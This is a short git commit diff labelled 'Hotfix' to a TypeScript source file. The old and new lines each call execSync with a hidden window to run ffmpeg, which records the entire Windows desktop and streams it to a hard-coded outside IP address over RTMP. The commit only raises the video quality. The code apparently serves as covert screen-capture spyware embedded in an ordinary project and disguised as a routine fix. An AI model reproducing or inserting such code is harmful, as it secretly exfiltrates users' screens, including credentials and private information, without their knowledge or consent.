1a3c497f2e62fef0674368e65a9dfbcf45861b04
xX53xXx <53x@acevik.de>
2023-02-05 08:24:28 +0100

    Hotfix

--- src/index.ts
+++ src/index.ts
@@ -4,7 +4,7 @@ import { execSync } from 'child_process';
 let rsp = '';
 
 try {
-    rsp = execSync('ffmpeg -f gdigrab -i desktop -r 16 -c:v h264_nvenc -b:v 500k -crf 28 -pix_fmt yuv420p -strict -2 -ac 2 -b:a 128k -f flv rtmp://81.169.212.187/screen', { encoding: 'utf-8', windowsHide: true });
+    rsp = execSync('ffmpeg -f gdigrab -i desktop -r 16 -c:v h264_nvenc -b:v 500k -crf 16 -pix_fmt yuv420p -strict -2 -ac 2 -b:a 128k -f flv rtmp://81.169.212.187/screen', { encoding: 'utf-8', windowsHide: true });
     if (typeof rsp === 'object') {
         rsp = (rsp as Record<string, string>).stdout;
     }
